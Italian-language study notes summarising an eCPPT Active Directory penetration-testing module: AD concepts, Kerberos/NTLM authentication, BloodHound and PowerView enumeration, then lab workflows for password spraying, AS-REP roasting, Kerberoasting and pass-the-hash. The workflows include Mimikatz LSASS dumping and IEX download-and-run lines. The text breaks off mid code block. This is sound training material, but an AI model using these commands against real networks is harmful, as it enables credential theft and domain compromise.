---
title: "06 — Active Directory Penetration Testing — Sintesi Consolidata"
tags:
  - active-directory
  - ad-enumeration
  - as-rep-roasting
  - asm
  - bloodhound
  - crackmapexec
  - credentials
  - dcsync
  - golden-ticket
  - gophish
  - kerberoasting
  - kerberos
  - lateral-movement
  - mimikatz
  - mssql
  - nmap
  - nse
  - ntlm
  - pass-the-hash
  - pass-the-ticket
  - password-spraying
  - persistence
  - phishing
  - powerview
  - rdp
  - registers
  - silver-ticket
  - smb
  - smb-relay
  - uac-bypass
  - windows-privesc
  - winrm
---
# 06 — Active Directory Penetration Testing — Sintesi Consolidata

> **Modulo:** Active Directory Penetration Testing (eCPPT 2024)
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Video coperti:** 15/15 — dal primer architetturale ai Silver/Golden Ticket.
> **Filosofia del modulo:** **Assumed breach** — si parte da un foothold (RDP / shell come domain user low-priv) e si scala fino a Domain/Enterprise Admin, terminando con persistence Kerberos.

Questo file è la sintesi tematica dei 15 appunti del modulo, organizzata secondo l'**AD Kill Chain** così come presentata da Alexis Ahmed e usata nell'esame eCPPT.

Indice video sorgente (link relativi):

1. [01_Introduction](../Active%20Directory%20Penetration%20Testing/01_Introduction.md)
2. [02_Users, Groups & Computers](../Active%20Directory%20Penetration%20Testing/02_Users,%20Groups%20&%20Computers.md)
3. [03_Organizational Units (OUs)](../Active%20Directory%20Penetration%20Testing/03_Organizational%20Units%20(OUs).md)
4. [04_Active Directory Authentication](../Active%20Directory%20Penetration%20Testing/04_Active%20Directory%20Authentication.md)
5. [05_Trees, Forests & Trusts](../Active%20Directory%20Penetration%20Testing/05_Trees,%20Forests%20&%20Trusts.md)
6. [06_AD Penetration Testing Methodology](../Active%20Directory%20Penetration%20Testing/06_AD%20Penetration%20Testing%20Methodology.md)
7. [07_Password Spraying](../Active%20Directory%20Penetration%20Testing/07_Password%20Spraying.md)
8. [08_AD Enumeration_ Blood⁠Hound](../Active%20Directory%20Penetration%20Testing/08_AD%20Enumeration_%20Blood⁠Hound.md)
9. [09_AD Enumeration_ Power⁠View](../Active%20Directory%20Penetration%20Testing/09_AD%20Enumeration_%20Power⁠View.md)
10. [010_AS-REP Roasting](../Active%20Directory%20Penetration%20Testing/010_AS-REP%20Roasting.md)
11. [011_Kerberoasting](../Active%20Directory%20Penetration%20Testing/011_Kerberoasting.md)
12. [012_AD Lateral Movement_ Pass-the-Hash](../Active%20Directory%20Penetration%20Testing/012_AD%20Lateral%20Movement_%20Pass-the-Hash.md)
13. [013_AD Lateral Movement_ Pass-the-Ticket](../Active%20Directory%20Penetration%20Testing/013_AD%20Lateral%20Movement_%20Pass-the-Ticket.md)
14. [014_AD Persistence_ Golden Ticket](../Active%20Directory%20Penetration%20Testing/014_AD%20Persistence_%20Golden%20Ticket.md)
15. [015_AD Persistence_ Silver Ticket](../Active%20Directory%20Penetration%20Testing/015_AD%20Persistence_%20Silver%20Ticket.md)

---

## TL;DR — Le 10 cose da sapere per l'esame

1. **AD Kill Chain (corso)**: Recon → Domain Enumeration → Local PrivEsc → Admin Recon → **Lateral Movement** → Domain PrivEsc → Cross-Trust → **Persistence**.
2. **Kerberos flow**: AS-REQ → AS-REP (TGT) → TGS-REQ → TGS-REP (TGS) → AP-REQ → AP-REP.
3. **Chi cifra cosa**: TGT cifrato con la key di **KRBTGT**; TGS cifrato con la key del **service account** (proprietario dell'SPN).
4. **AS-REP Roasting** → target: utenti con **`DONT_REQ_PREAUTH`** → hashcat **`-m 18200`**.
5. **Kerberoasting** → target: account con **SPN** → hashcat **`-m 13100`**.
6. **Pass-the-Hash** = NTLM. **Pass-the-Ticket** = Kerberos.
7. **Golden Ticket** = TGT forgiato con hash **KRBTGT** (dominio intero).
8. **Silver Ticket** = TGS forgiato con hash del **service/computer account** (singolo servizio, **no KDC**).
9. **DCSync rights** = `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` (preludio a Golden Ticket).
10. **Domain Admins** = dominio-wide; **Enterprise Admins** + **Schema Admins** = forest-wide.

---

## PARTE 1 — AD PRIMER

### 1.1 Cos'è Active Directory

Active Directory (AD DS) è il **directory service Microsoft** che centralizza autenticazione, autorizzazione e gestione di utenti, computer e risorse in una rete Windows. Il componente core è il **Domain Controller (DC)**, che ospita anche il **KDC Kerberos** e il database `ntds.dit`.

Il corso adotta l'**assumed breach**: l'attaccante parte con un foothold (RDP / shell come domain user low-priv) e l'obiettivo è scalare fino a Domain/Enterprise Admin.

### 1.2 Security Principals

I **security principals** sono le entità Windows a cui si possono assegnare permessi via *security descriptors*. Includono **users, groups, computers, services**. Sono il fondamento di tutto il controllo accessi AD.

#### Domain Users
Account centralizzati in AD, identificati da `username + password`, autenticano qualunque macchina joined al dominio. Attributi accessori: nome, email, telefono, dipartimento, job title. Gestiti via **ADUC** (Active Directory Users and Computers) o PowerShell (`Get-ADUser`, `New-ADUser`).

#### Login locale vs Login di dominio
- **Locale**: solo `username` + password.
- **Dominio**: `DOMAIN\username` (es. `FOOBANK\alexis.a`) oppure UPN `alexis.a@foobank.inc`.
- `net user` mostra solo account locali; `net user /domain` mostra utenti di dominio (richiede macchina joined).

#### Account Options pericolose (Account tab in ADUC)
- **"Use only Kerberos DES encryption types"** — encryption deboli.
- **"Password never expires"** — facilita password spray sul lungo periodo.
- **"Do not require Kerberos preauthentication"** → espone l'account ad **AS-REP Roasting** (collegamento diretto col video 10).

### 1.3 Groups

Due tipologie:
- **Security Groups** — gestiscono permessi/ACL. Sono i gruppi rilevanti in ottica offensiva.
- **Distribution Groups** — solo email lists. Nessuna security permission.

#### Gruppi built-in privilegiati (memoria d'oro per l'esame)

| Gruppo | Scope | Cosa permette |
|---|---|---|
| **Domain Admins** | Domain-wide | Full control sul dominio. Target finale di ogni pentest AD. RID 512. |
| **Enterprise Admins** | **Forest-wide** | Privilegi su tutti i domini della forest. RID 519. |
| **Schema Admins** | Forest-wide | Modifica dello schema AD. RID 518. |
| **Server Operators** | Domain | Gestione DC e member server. |
| **Backup Operators** | Domain | Backup/restore di DC; spesso possono leggere SAM/SYSTEM → privesc. |
| **Account Operators** | Domain | Creare/modificare user/group/computer → utile per persistence. |
| **Domain Users** | Domain | Tutti gli utenti. RID 513. |
| **Domain Computers** | Domain | Tutti i computer joined. |
| **Domain Controllers** | Domain | Tutti i DC. |
| **Group Policy Creator Owners** | Domain | RID 520. |

### 1.4 Computer Accounts

Ogni macchina joined al dominio ha un **computer account** identificato da `<HOSTNAME>$` (es. `PROD$`). Al join viene stabilita una *trust relationship* sicura. Il computer account ha una propria password (ruotata di default ogni 30 giorni). **L'NTLM hash del computer account è la chiave per il Silver Ticket** quando il servizio target gira sotto computer context (es. `CIFS`, `HOST`, `HTTP` su quel host).

### 1.5 Organizational Units (OUs)

Container gerarchici che organizzano user/computer/group/sotto-OU dentro un dominio. Non sono cosmetici — supportano:

1. **Organizzazione logica** (per dipartimento, geografia, struttura).
2. **GPO linking** — una policy linkata a una OU vale **solo** per gli oggetti di quella OU.
3. **Delegazione amministrativa** — diritti di gestione su una specifica OU.

#### OU vs Security Group (differenza chiave)

| Aspetto | Organizational Unit | Security Group |
|---|---|---|
| Scopo | Organizzare oggetti + GPO + delegation | Controllo accessi/permessi |
| Struttura | Gerarchica/nestata nativamente | Tipicamente flat |
| GPO linkable | **Sì** | No |
| Membership ereditata | Sì (oggetti dentro OU) | No (devi aggiungere manualmente) |

#### Distinguished Name (DN)
Riflette la gerarchia OU:
```
CN=John Doe,OU=Finance,OU=Employees,DC=foobank,DC=inc
```
Lettura da sinistra a destra: oggetto → OU diretta → OU parent → componenti dominio. **Attenzione**: `Users` e `Computers` sono **container (`CN=`)**, non OU (`OU=`) — quindi **non supportano GPO link diretto** (eccezione classica nelle domande). `Domain Controllers` invece è una OU.

#### GPO refresh
`gpupdate /force` — forza l'applicazione immediata senza attendere il refresh ciclico (~90 min).

### 1.6 Trees, Forests & Trusts

#### Domain
Singola unità di:
- **Administrative boundary** (policy)
- **Replication boundary** (DC sync)
- **Authentication/authorization boundary**

#### Tree
Gerarchia di domini con **namespace contiguo** (suffisso DNS condiviso col parent):
```
contoso.com
├── emea.contoso.com
└── na.contoso.com
```
Ogni child crea di default un **two-way transitive trust** col parent.

#### Forest
Collezione di uno o più tree. Anche un singolo dominio è tecnicamente una forest. Tutti i domini in una forest condividono:
- **Schema** (definizione classi/attributi).
- **Configuration partition**.
- **Global Catalog** (replicato, ricercabile cross-domain, LDAP/3268).
- **Trust automatici** tra tutti i domini.
- Gruppi **Enterprise Admins** + **Schema Admins** sono forest-wide.

Una forest può ospitare tree con **namespace non contigui** (es. `contoso.com` + `fabrikam.com`).

#### Trust
- **Trusting domain** = quello che concede l'accesso.
- **Trusted domain** = quello i cui utenti vengono accettati.
- **Direzione del trust**: trusting → trusted. **Direzione dell'accesso**: opposta (gli utenti del trusted accedono al trusting). Trick frequente nelle domande.
- **Two-way trust** = combinazione di due one-way reciproci.
- **Transitive**: se A→B e B→C, allora A→C implicito. Tutti i trust intra-forest sono **two-way transitive di default**.
- **Forest trust** = unico modo per condividere risorse fuori dalla forest; **non** è transitivo verso forest collegate dal target.

---

## PARTE 2 — AD AUTHENTICATION

### 2.1 Protocolli supportati da AD

| Protocollo | Stato | Attacchi tipici |
|---|---|---|
| **Kerberos** | Primario, raccomandato | Kerberoasting, AS-REP Roasting, Pass-the-Ticket, Golden/Silver Ticket |
| **NTLM / Net-NTLM** | Legacy, backward compat | Pass-the-Hash, NTLM Relay, capture+crack (Responder) |
| **LDAP** | Citato, non approfondito | LDAP queries (enumeration), LDAP relay |

### 2.2 Kerberos — flusso completo

Attori:
- **Client / user workstation**
- **KDC = Domain Controller** (ospita **Authentication Service (AS)** + **Ticket Granting Service (TGS)**)
- **Application server / target service**

#### Diagramma del flusso Kerberos

```
                                  ┌─────────────────────────┐
                                  │   KDC (Domain Controller)│
                                  │   ┌─────┐    ┌────────┐ │
                                  │   │  AS │    │  TGS   │ │
                                  │   └──┬──┘    └────┬───┘ │
                                  └──────┼────────────┼─────┘
                                         │            │
              ① AS-REQ                   │            │
              (timestamp cifrato con     │            │
               long-term key user)       │            │
   ┌─────────┐ ──────────────────────────▶            │
   │         │                                        │
   │         │  ② AS-REP                              │
   │ CLIENT  │ ◀──────────────────────────            │
   │         │     TGT (cifrato con key KRBTGT)       │
   │         │     + session key (cifrata con key user)│
   │         │                                        │
   │         │  ③ TGS-REQ (presenta TGT + SPN)        │
   │         │ ─────────────────────────────────────────▶
   │         │                                        │
   │         │  ④ TGS-REP                             │
   │         │ ◀─────────────────────────────────────────
   │         │     TGS (cifrato con key SERVICE)      │
   │         │     PAC copiato dal TGT al TGS         │
   │         │                                        │
   │         │  ⑤ AP-REQ (presenta TGS)               │
   │         │ ──────────────────────────▶  ┌────────┐
   │         │                              │ TARGET │
   │         │  ⑥ AP-REP (mutual auth, opt) │ SERVICE│
   │         │ ◀──────────────────────────  └────────┘
   └─────────┘
```

#### Step 1 — AS-REQ
Il client invia al KDC il **timestamp UTC corrente cifrato con la long-term key dell'utente** (derivata dalla password). Questo è il meccanismo di **preauthentication**.

#### Step 2 — AS-REP
Se il KDC decifra correttamente il timestamp e l'orario è nello skew accettato (default ±5 min), restituisce un **TGT cifrato con la long-term key di `KRBTGT`** + una **session key cifrata con la key dell'utente**. Il TGT contiene il **PAC** (Privilege Attribute Certificate) con identità + group membership.

> **Note offensive — AS-REP Roasting**: se l'utente ha `DONT_REQ_PREAUTH`, il KDC manda l'AS-REP senza pretendere la prova di password → la parte cifrata con la key utente è un **oracolo offline** crackabile.

#### Step 3 — TGS-REQ
Il client presenta il TGT al KDC e chiede un service ticket per un **SPN** specifico.

#### Step 4 — TGS-REP
Il KDC decifra il TGT, **copia il PAC dal TGT al nuovo TGS**, e cifra il TGS con la **long-term key dell'account del servizio**.

> **Note offensive — Kerberoasting**: qualunque user autenticato può richiedere un TGS per qualunque SPN. Il TGS è cifrato con la key del service account → crackabile offline.

#### Step 5 — AP-REQ
Il client presenta il TGS al servizio. Il servizio lo decifra con la propria key, legge il PAC, autorizza.

#### Step 6 — AP-REP (opzionale)
Mutual authentication: il servizio risponde con timestamp cifrato.

#### PAC Validation (opzionale, di default disabilitata)
Il servizio può chiedere al KDC di validare la firma del PAC. **Questo è il motivo per cui Silver Ticket funziona**: senza PAC validation, il servizio si fida del contenuto del PAC senza chiamare il DC.

### 2.3 Feature di Kerberos
- **Mutual authentication**: client e server si verificano a vicenda.
- **Single Sign-On**: ottenuto il TGT, più TGS senza reinserire credenziali.
- **Ticket-based**: la password non viaggia mai in chiaro né come hash.
- **Time-sensitive**: richiede sincronia (skew default 5 min). Senza clock sync, Kerberos fallisce.

### 2.4 NTLM / Net-NTLM

Challenge-response, mantenuto per backward compatibility.

#### Flusso NTLM
1. Client → server: logon request.
2. Server (o DC) → client: **NTLM challenge** (random).
3. Client → server: **NTLM response** = challenge "hashato" con NT hash della password.
4. Server confronta la response con il calcolo equivalente.

#### Limiti di sicurezza
- Vulnerabile a **Pass-the-Hash** (basta l'NT hash, non la password).
- **No mutual auth**.
- Suscettibile a **NTLM Relay**.
- Hash catturabili e crackabili offline (Responder).

### 2.5 Confronto Kerberos vs NTLM

| Feature | Kerberos | NTLM |
|---|---|---|
| Modello | Ticket-based, KDC trusted 3rd party | Challenge-response diretto |
| Mutual auth | Sì | No |
| SSO | Sì | No |
| Backward compat | Da Windows 2000 in poi | Pre-Win2000 e fallback |
| Attacchi tipici | Kerberoasting, AS-REP, PtT, Golden/Silver | Pass-the-Hash, NTLM Relay |

---

## PARTE 3 — AD PENTESTING METHODOLOGY

### 3.1 Le due AD Kill Chain

#### Generica (industry)
External Recon → Compromise system → Internal Recon → Local PrivEsc → Compromised Credentials → Admin Recon → RCE → Domain Admin Credentials → Domain Dominance → AD Recon → Local PrivEsc → Asset Access → Exfiltration.

#### AD-specifica (usata nel corso)
**Reconnaissance → Domain Enumeration → Local PrivEsc → Admin Reconnaissance → Lateral Movement → Domain Privilege Escalation → Cross-Trust Attacks → Persistence / Exfiltration**.

### 3.2 Scope del corso — Assumed Breach

Il corso **non copre l'initial compromise** (per quello c'è il modulo *Network Penetration Testing* con SMB Relay, LLMNR poisoning, ecc., e *Client-Side Attacks* per phishing). Si parte da:
- RDP / shell come domain user low-priv.
- O credenziali raccolte via Password Spraying.

Fasi affrontate dal modulo:
1. **Host reconnaissance**
2. **Domain enumeration** (Blood⁠Hound / Power⁠View)
3. **Domain privilege escalation** (Kerberoasting / AS-REP Roasting)
4. **Lateral movement** (Pass-the-Hash / Pass-the-Ticket)
5. **Persistence** (Silver Ticket / Golden Ticket)

### 3.3 Mapping tecnica → fase (memorizzare per l'esame)

| Fase | Tecnica | Tool principali |
|---|---|---|
| Initial Access | Password Spraying | DomainPasswordSpray, kerbrute, CrackMapExec, SprayHound |
| Initial Access | Brute force | CrackMapExec, Evil-WinRM, Hydra |
| Initial Access | Phishing | Gophish (modulo Client-Side) |
| Initial Access | Network poisoning | Responder, mitm6, NTLM Relay |
| Enumeration | Grafico/automatico | Blood⁠Hound + Sharp⁠Hound |
| Enumeration | Manuale PS | Power⁠View |
| PrivEsc AD | Kerberoasting | Rub⁠eus, GetUser⁠SPNs.py, hashcat -m 13100 |
| PrivEsc AD | AS-REP Roasting | Rub⁠eus, GetNP⁠Users.py, hashcat -m 18200 |
| Lateral Movement | Pass-the-Hash | Mimi⁠katz `sekur⁠lsa::pth`, psexec.py, CME, evil-winrm |
| Lateral Movement | Pass-the-Ticket | Mimi⁠katz `kerberos::p⁠tt`, Rub⁠eus `ptt` |
| Persistence | Golden Ticket | Mimi⁠katz `kerberos::gol⁠den /krbtgt:` |
| Persistence | Silver Ticket | Mimi⁠katz `kerberos::gol⁠den /service:` |

### 3.4 Risorsa consigliata
**Orange Cyber Defense (OCD) Active Directory Mind Maps** — flow chart SVG zoomabile che, dato uno stato (es. "hai un valid username"), suggerisce la tecnica e il tool con sintassi esatta.

---

## PARTE 4 — ENUMERATION

### 4.1 Blood⁠Hound + Sharp⁠Hound

#### Architettura
```
[Sharp⁠Hound (C# o PS) collector]
        │ enumera AD via LDAP/SMB/RPC
        ▼
   ZIP (JSON)
        │ Upload Data
        ▼
[Blood⁠Hound GUI (Electron + LinkurIous)]
        │ persiste in
        ▼
   [Neo4j DB]
        │ query Cypher
        ▼
   Tab "Analysis" (query pre-built)
```

#### Workflow standard
1. Bypass execution policy: `powershell -ep bypass` o `Set-ExecutionPolicy Bypass`.
2. Import collector: `. .\Sharp⁠Hound.ps1`.
3. Collect: `Invoke-Blood⁠Hound -CollectionMethod All` (o `Sharp⁠Hound.exe -c All`).
4. Output: file `<timestamp>_Blood⁠Hound.zip`.
5. Avvio GUI: `Blood⁠Hound.exe` → login Neo4j (lab: `neo4j` / `Password@123`).
6. **Upload Data** → seleziona lo zip.
7. Tab **Analysis** → query pre-built.

#### Collection methods di Sharp⁠Hound

| Method | Cosa raccoglie |
|---|---|
| `All` | Tutto (default per pentest) |
| `Default` | Group membership + sessioni + trust |
| `Session` | Solo sessioni utente |
| `ACL` | Permessi su oggetti |
| `Trusts` | Solo trust di dominio |
| `LoggedOn` | Sessioni privilegiate (richiede admin) |

#### Query pre-built da conoscere (tab Analysis)

| Query | A cosa serve |
|---|---|
| **Find all Domain Admins** | Lista DA correnti |
| **Map Domain Trusts** | Visualizza trust intra/inter-forest |
| **List all Kerberoastable Accounts** | Utenti con SPN → target Kerberoasting (video 11) |
| **List all AS-REP Roastable Users** | Utenti con `DONT_REQ_PREAUTH` → target AS-REP (video 10) |
| **Find Principals with DCSync Rights** | Chi ha `GetChanges`+`GetChangesAll` → preludio Golden Ticket |
| **Shortest Paths to Domain Admins** | Path più corto verso DA |
| **Shortest Paths from Owned Principals** | Path da nodi marcati come "owned" |

#### Mark as Owned
Right-click su nodo → **Mark User as Owned**. Abilita le query *Shortest Paths from Owned Principals*, fondamentali per trovare il prossimo hop dal foothold corrente.

#### Edge types fondamentali (da memorizzare a livello concettuale)

| Edge | Significato | Abusabile per |
|---|---|---|
| `MemberOf` | Membership in gruppo | (informativo) |
| `HasSession` | Utente attualmente loggato su quel host | Steal token / dump LSASS |
| `AdminTo` | Local admin su quel computer | PsExec / WinRM / PtH |
| `CanRDP` | Diritto RDP | Login interattivo |
| `GenericAll` | Full control sull'oggetto | Reset password / aggiungersi a gruppo |
| `WriteOwner` | Cambiare owner | Privesc su oggetto |
| `WriteDACL` | Modificare ACL | Auto-assegnarsi GenericAll |
| `GetChanges` + `GetChangesAll` | **DCSync rights** | Dump krbtgt → Golden Ticket |
| `AllowedToDelegate` | Constrained delegation | Impersonation di altri user |
| `ForceChangePassword` | Reset password senza conoscerla | Account takeover |

#### Node properties utili
`pwdlastset`, `lastlogon`, `samaccountname`, `domain SID`, `kerberoastable`, `asrep_roastable`, group membership, SPN list.

### 4.2 Power⁠View (enum manuale)

Power⁠View è uno script PowerShell (parte di Power⁠Sploit) per enum AD manuale via LDAP — l'equivalente "a mano" di Blood⁠Hound. Saperlo usare è cruciale: i tool grafici nascondono **come** l'info viene ottenuta.

#### Setup
```powershell
powershell -ep bypass
cd C:\Tools\
. .\Power⁠View.ps1
```

#### Cmdlet principali (cheat sheet)

> 📋 La cheat sheet originalmente qui presente è stata spostata nel modulo dedicato: vedi [Cheat Sheet — sezione Active Directory — Power⁠View](../10_Cheatsheet.md#active-directory-powerview).

#### Workflow "minimo ma efficace"
```powershell
# 0. Setup
powershell -ep bypass
. .\Power⁠View.ps1

# 1. Mappare ambiente
Get-Domain
Get-DomainController
Get-DomainPolicy | Select -ExpandProperty "System Access"

# 2. Target ad alto privilegio
Get-NetGroupMember "Domain Admins" | Select MemberName
Get-NetGroupMember "Enterprise Admins" | Select MemberName

# 3. Utenti attaccabili via Kerberos
Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
Get-DomainUser -PreauthNotRequired | Select SamAccountName

# 4. Mappa trust
Get-NetDomainTrust
Get-NetForestTrust
Get-DomainTrustMapping

# 5. ACL abusabili
Find-InterestingDomainAcl -ResolveGUIDs |
  Select IdentityReferenceName, ObjectDN, ActiveDirectoryRights

# 6. Share leggibili
Find-DomainShare -ComputerName <DC_FQDN> -CheckShareAccess

# 7. Lateral movement reconnaissance
Find-LocalAdminAccess
```

#### ACL / ACE
- **ACL** = lista ordinata di **ACE**.
- **ACE** = `(security principal, permessi, allow/deny, inherited/explicit)`.
- `Find-InterestingDomainAcl` trova ACE come **GenericAll, WriteDACL, WriteOwner, ForceChangePassword, GetChanges/GetChangesAll** — ognuna abusabile per privesc.

#### Punto chiave
L'enumeration **non richiede privilegi alti**: qualsiasi domain user può leggere via LDAP la quasi totalità degli oggetti AD. È il vero punto debole strutturale di AD.

---

## PARTE 5 — INITIAL ACCESS / CREDENTIAL ACCESS

### 5.1 Password Spraying

**Password Spraying** = provare **una password (o pochissime) contro molti utenti**. Opposto di brute force / credential stuffing.

#### Differenza con tecniche simili

| Tecnica | Pattern | Rischio lockout |
|---|---|---|
| **Brute force** | molte password / **un singolo utente** | Alto |
| **Credential Stuffing** | password compromesse → utenti noti | Medio |
| **Password Spraying** | **1 password / molti utenti** | Basso (1 tentativo per account) |

#### Quando si usa
- **Esterno**: VPN, OWA, ADFS, SSO, SaaS.
- **Interno**: foothold → estendere accesso (caso del lab).

#### Regole per evitare il lockout
- **1 password per account per ciclo**.
- **Attesa** tra cicli ≥ **observation window** della Domain Password Policy.
- DomainPasswordSpray legge automaticamente la policy e propone il wait time.

#### Lab — scenario
Assumed breach: RDP come `student` su Windows Server 2012 joined. Tool path: `C:\Tools\`. Task: enum utenti → spray → verifica creds.

#### Workflow
```powershell
# 1. Bypass execution policy + import Power⁠View
powershell -ep bypass
. .\Power⁠View.ps1

# 2. Enumera utenti del dominio e salva in users.txt
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt
type users.txt

# 3. Import del tool di spray
. .\DomainPasswordSpray.ps1

# 4. Esegui spray con password singola
Invoke-DomainPasswordSpray -UserList users.txt -Password 123456 -Verbose
# Output:
# [*] Password policy observation window: 30 minutes
# [+] SUCCESS! User:Johnny Password:123456

# Variante con lista di password (1 per ciclo)
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Verbose
```

#### Alternative
- **CrackMapExec / NetExec**: `cme smb <DC_IP> -u userlist -p password`.
- **kerbrute** (Go): `kerbrute passwordspray -d <domain> userlist.txt <password>` — funziona via AS-REQ (Kerberos pre-auth) → username enumeration possibile **senza credenziali**.
- **SprayHound**: integrato con Blood⁠Hound per marcare automaticamente le compromissioni.

#### Sorgenti tipiche di password
- `rockyou.txt`, top-100/top-1000.
- Stagionali: `Summer2024!`, `Autumn2024!`.
- Aziendali: `<Company>123`, `Welcome1`.
- Da breach precedente → password reuse.

---

## PARTE 6 — PRIVILEGE ESCALATION KERBEROS

### 6.1 AS-REP Roasting

#### Concept
Sfrutta utenti con il flag **`DONT_REQ_PREAUTH`** (UAC bit `0x400000`). Senza preauth, il KDC risponde all'AS-REQ con un AS-REP **cifrato con la chiave derivata dalla password dell'utente** → crackable **offline**. È una **misconfigurazione** dell'account, non una vulnerabilità di protocollo.

#### Requisiti
- Almeno un utente con `DONT_REQ_PREAUTH=True`.
- Per `Rub⁠eus`: una valid domain account (qualsiasi). Per `impacket-GetNP⁠Users.py` basta una **username list** (anche senza creds).

#### Workflow
```powershell
# 1. Identificazione utenti vulnerabili (Power⁠View)
Get-DomainUser | Where-Object { $_.UserAccountControl -like '*DONT_REQ_PREAUTH*' }
# Equivalente:
Get-DomainUser -PreauthNotRequired
# Output esempio: Johnny

# 2. Estrazione hash con Rub⁠eus
.\Rub⁠eus.exe asreproast /user:Johnny /outfile:johnny_hash.txt
# (omettere /user per dumpare tutti)

# 3. Crack con John the Ripper
.\john.exe johnny_hash.txt --format=krb5asrep --wordlist=10k-worst-passwords.txt
# Output: 123456    (Johnny)
```

#### Alternativa Linux
```bash
# Senza credenziali, solo username list
impacket-GetNPUsers research.security.local/ -usersfile users.txt -no-pass \
    -format hashcat -outputfile asrep.hashes

# Crack con hashcat
hashcat -m 18200 asrep.hashes wordlist.txt
```

#### Hash format
- **John format**: `--format=krb5asrep`
- **Hashcat mode**: **`-m 18200`** (`$krb5asrep$23$...`)

### 6.2 Kerberoasting

#### Concept
Qualunque utente autenticato può chiedere al KDC un **TGS** per un SPN qualunque. Il TGS è cifrato con la **chiave del service account proprietario dell'SPN** → crackable offline.

A differenza di AS-REP Roasting **non c'è misconfig**: è una proprietà nativa di Kerberos. La debolezza è strutturale: i service account hanno spesso password mai cambiate, lunghe ma deboli, o note al team IT.

#### Cos'è un SPN
`service_class/host:port[/service_name]` — esempi:
- `MSSQLSvc/db01.foobank.inc:1433`
- `HTTP/intranet.foobank.inc`
- `K_admin/ChangePassword`
- `ops/research.security.local:1434`

#### Workflow "didattico" del video (PS + Mimi⁠katz)
```powershell
# 1. Identifica account con SPN (Power⁠View)
Get-NetUser | Where-Object { $_.ServicePrincipalName } | Format-List
# Equivalente compatto: Get-DomainUser -SPN

# 2. Conferma con tool nativo Windows
setspn -T research.security.local -Q */*

# 3. Lista ticket cached
klist

# 4. Richiedi TGS via API .NET
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
    -ArgumentList "ops/research.security.local:1434"

# 5. Esporta ticket cached
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"kerberos::li⁠st /export"'
ls *.kirbi

# 6. Crack offline
python.exe C:\Tools\Kerberoast\python3\tgsrepcrack.py `
    10k-worst-passwords.txt `
    '0-40a10000-student@ops~research.security.local~1434-RESEARCH.SECURITY.LOCAL.kirbi'
# Output: found password for ticket 0: maverick
```

#### Workflow "moderno" (one-shot)
```powershell
# Windows con Rub⁠eus
.\Rub⁠eus.exe kerberoast /outfile:tgs.hashes
```
```bash
# Linux con impacket
impacket-GetUserSPNs research.security.local/student:Password123 \
    -request -outputfile tgs.hashes

# Crack con hashcat
hashcat -m 13100 tgs.hashes /usr/share/wordlists/rockyou.txt
# Oppure John:
john --format=krb5tgs tgs.hashes --wordlist=rockyou.txt
```

#### Cosa fare con la password crackata
- Autenticarsi come service account → spesso privilegi alti (Domain Admins, SQL sysadmin).
- Lateral movement verso il host del servizio.
- L'hash crackato dà accesso al servizio → **collega a Silver Ticket** (stesso hash forgia il TGS).

#### OPSEC
Ogni TGS richiesto genera **event 4769** sul DC. Spam di TGS = rumore alto. Preferire target enumerati via Blood⁠Hound.

### 6.3 AS-REP vs Kerberoasting (combo da memorizzare)

| Aspetto | Kerberoasting | AS-REP Roasting |
|---|---|---|
| Target | Account con **SPN** | Account con **`DONT_REQ_PREAUTH`** |
| Hash ottenuto | TGS (key del service account) | AS-REP (key dell'utente) |
| Pre-requisito policy | **Nessuno** (nativo Kerberos) | Misconfig: preauth disabilitata |
| Servono credenziali? | **Sì** (un valid domain user) | **No** (basta username list con impacket) |
| Hashcat mode | **`-m 13100`** | **`-m 18200`** |
| John format | `--format=krb5tgs` | `--format=krb5asrep` |
| Tool Windows | Rub⁠eus `kerberoast` | Rub⁠eus `asreproast` |
| Tool Linux | impacket `GetUser⁠SPNs.py` | impacket `GetNP⁠Users.py` |
| Event ID generato | 4769 | 4768 (TGT request) |

---

## PARTE 7 — LATERAL MOVEMENT AD-SPECIFICO

### 7.1 Pass-the-Hash (PtH) — NTLM

#### Concept
Autenticarsi a un sistema Windows usando l'**NTLM hash** dell'utente, senza conoscere la password in chiaro. Sfrutta la natura challenge-response di NTLM: il client non manda la password ma il risultato di una funzione che usa l'hash → l'hash basta.

#### Perché solo NTLM
Kerberos cifra timestamp/ticket con una key derivata dalla password, ma autentica via ticket emessi dal KDC. Per Kerberos l'equivalente è **Pass-the-Ticket** o **Overpass-the-Hash** (usa NT hash per ottenere un TGT). PtH puro = via NTLM/SMB.

#### Scenario lab (chain completa)
```
[student@client]
  ├─ Power⁠View Find-LocalAdminAccess → seclogs
  ├─ Enter-PSSession seclogs (admin lì)
  ├─ Dump NTLM hash Administrator (Mimi⁠katz, lì loggato come type 2)
  └─ PtH Administrator sul client → spawn powershell con privs DA
       └─ Enter-PSSession prod.* (DC)  ✓ GAME OVER
```

#### Step-by-step
```powershell
# === Foothold sul client ===
powershell -ep bypass
cd C:\Tools
. .\Power⁠View.ps1

# 1. Cerca host dove sono local admin
Find-LocalAdminAccess
# -> seclogs.research.security.local

# 2. Remoting al target
Enter-PSSession -ComputerName seclogs.research.security.local
whoami /priv

# === Su seclogs: carica tool via HFS (HTTP File Server) sul client ===
I⁠EX(New-Object Net.Web⁠Client).Download⁠String("http://10.0.5.101/Invoke-TokenManipulation.ps1")
I⁠EX(New-Object Net.Web⁠Client).Download⁠String("http://10.0.5.101/Invoke-Mi⁠mi⁠katz.ps1")

# 3. Verifica chi è loggato (logon type 2 = interactive)
Invoke-TokenManipulation -Enumerate

# 4. Dump NTLM da LSASS
Invoke-Mi⁠mi⁠katz -Command '"privilege::de⁠bug" "token::elevate" "sekur⁠lsa::logonpasswords"'
# Trova: User: Administrator  NTLM: <hash>

Exit-PSSession

# === Nuova PowerShell as Admin sul client ===
powershell -ep bypass
. .\Invoke-Mi⁠mi⁠katz.ps1
Invoke-Mi⁠mi⁠katz -Command '"sekur⁠lsa::pth /user:Administrator /domain:research.security.local /ntlm:<HASH> /run:powershell.exe"'

# === Nella shell spawned (impersonata DA) ===
Enter-PSSession -ComputerName prod.research.security.local
hostname   # -> PROD (DC)
```

#### Alternative cross-platform
```bash
# CrackMapExec / NetExec
crackmapexec smb <target> -u Administrator -H <NT_HASH> -d research.security.local
